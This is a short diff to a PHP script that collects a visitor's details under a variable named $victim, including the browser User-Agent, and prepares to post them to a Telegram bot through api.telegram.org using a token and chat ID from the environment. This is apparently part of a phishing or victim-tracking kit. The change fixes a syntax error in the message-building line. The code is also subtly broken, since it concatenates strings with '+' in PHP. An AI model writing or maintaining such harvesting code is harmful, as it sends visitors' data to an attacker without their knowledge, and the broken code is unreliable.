@@ -41,7 +41,7 @@ $browser = $_SERVER['HTTP_USER_AGENT']."\r\n";
 $victim = "IP: ";
 
 
-$message += $victim +"%0A" + $browser +"%0A" +$useragent +"%0A" +"%0A":
+$message += $victim +"%0A" + $browser +"%0A" +$useragent +"%0A" +"%0A";
 $tgbot = getenv('TGBOT', true) ?: getenv('TGBOT');
 $tgchat = getenv('TGCHAT', true) ?: getenv('TGCHAT');
 $url = 'http://api.telegram.org/bot'+$tgbot+'/sendMessage';
